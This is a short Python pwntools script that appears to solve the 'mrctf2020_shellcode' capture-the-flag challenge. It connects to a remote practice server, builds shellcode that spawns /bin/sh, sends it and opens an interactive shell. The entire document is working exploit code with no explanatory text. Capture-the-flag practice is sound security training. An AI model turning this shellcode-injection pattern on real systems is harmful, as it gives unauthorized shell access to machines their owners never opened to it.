#coding:utf-8
from pwn import *
context.log_level = 'debug'
context.arch = "amd64"
context.os = 'linux'
# sh = process("./mrctf2020_shellcode")
sh = remote("node3.buuoj.cn",26254)
payload = asm(shellcraft.sh())
sh.sendline(payload)
sh.interactive()